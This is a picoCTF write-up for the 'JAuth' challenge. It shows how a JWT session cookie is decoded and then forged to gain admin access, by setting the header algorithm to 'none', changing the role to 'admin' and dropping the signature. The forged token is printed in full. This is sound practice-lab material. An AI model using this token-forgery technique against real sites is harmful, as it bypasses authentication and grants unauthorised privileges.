# JAuth

**Challenge Link:** <https://play.picoctf.org/practice/challenge/236?difficulty=2&originalEvent=gym&page=2>

## Writeup

For this challenge we need to try and become `admin` on the vulnerable site. We are also given credentials `test:Test123!`.

### Starting Enumeration

Once I opened the page I was greeted by a simple login page with nothing really standing out.

![Login Page](images/login-page.png)

I opened my browser's (Firefox) **devtools** and opened the **network** tab so I can see what happens when I login using the provided credentials.

### JWT Token Found

Once I logged in I saw that a cookie was set by the server but I don't know what type of token it is.

```http
Set-Cookie: token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJhdXRoIjoxNzY1MTUwNzIwNDA5LCJhZ2VudCI6Ik1vemlsbGEvNS4wIChXaW5kb3dzIE5UIDEwLjA7IFdpbjY0OyB4NjQ7IHJ2OjE0NS4wKSBHZWNrby8yMDEwMDEwMSBGaXJlZm94LzE0NS4wIiwicm9sZSI6InVzZXIiLCJpYXQiOjE3NjUxNTA3MjB9.uAReE_I-FuYltH4ZqsOjfB_wwQ_Ky7aLE4Et-juOhkg; path=/; httponly
```

I copied the token's value into [CyberChef](https://gchq.github.io/CyberChef/) and it auto detected the value as a JWT Token.

![CyberChef Found the JWT](images/cc-jwt-decode.png)

### JWT Explained

A JWT token is a structure made up of a header.payload.signature sepearted using periods (`.`) and each section is **Base64 URL encoded** rather than the whole thing(That's why we can see `.` in the token value).

If I change my **CyberChef Recipe** to `From Base64` I can get the 3 pieces.

```JWT
Header = {"typ":"JWT","alg":"HS256"}

Payload = {"auth":1765150720409,"agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:145.0) Gecko/20100101 Firefox/145.0","role":"user","iat":1765150720}

Signature = Gibberish
```

The JWT vulnerability I'm planning on exploiting requires us to set the `alg` field in the header to `none` and remove the signature. This allows us to change the payload values without needing to worry about the signature validation.

### JWT Exploited

Now I just need to apply the exploit to the current case.

```JWT
Original Token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJhdXRoIjoxNzY1MTUzMTc3NDMzLCJhZ2VudCI6Ik1vemlsbGEvNS4wIChXaW5kb3dzIE5UIDEwLjA7IFdpbjY0OyB4NjQ7IHJ2OjE0NS4wKSBHZWNrby8yMDEwMDEwMSBGaXJlZm94LzE0NS4wIiwicm9sZSI6InVzZXIiLCJpYXQiOjE3NjUxNTMxNzd9.6KWQUToDnu6qMfUsPy0O2CMMfOKNFuZFDEliB86Z6Mc

Header: {"typ":"JWT","alg":"HS256"} = {"typ":"JWT","alg":"none"}

Payload: {"auth":1765152176371,"agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:145.0) Gecko/20100101 Firefox/145.0","role":"user","iat":1765152176} = {"auth":1765152176371,"agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:145.0) Gecko/20100101 Firefox/145.0","role":"admin","iat":1765152176}

Signature: WfÕ ¶÷pÞÞtBhî]I·Ìr«ÍCÒÖ = NULL

New Token: eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJhdXRoIjoxNzY1MTUzMTc3NDMzLCJhZ2VudCI6Ik1vemlsbGEvNS4wIChXaW5kb3dzIE5UIDEwLjA7IFdpbjY0OyB4NjQ7IHJ2OjE0NS4wKSBHZWNrby8yMDEwMDEwMSBGaXJlZm94LzE0NS4wIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNzY1MTUzMTc3fQ.
```

**Note**: Do not forget the trailing `.` it is mandatory even if you don't have a signature.

Once I put the new token in as my session cookie I was taken to the admin page and given the flag!!!

![Got Admin!!!](images/got-admin.png)
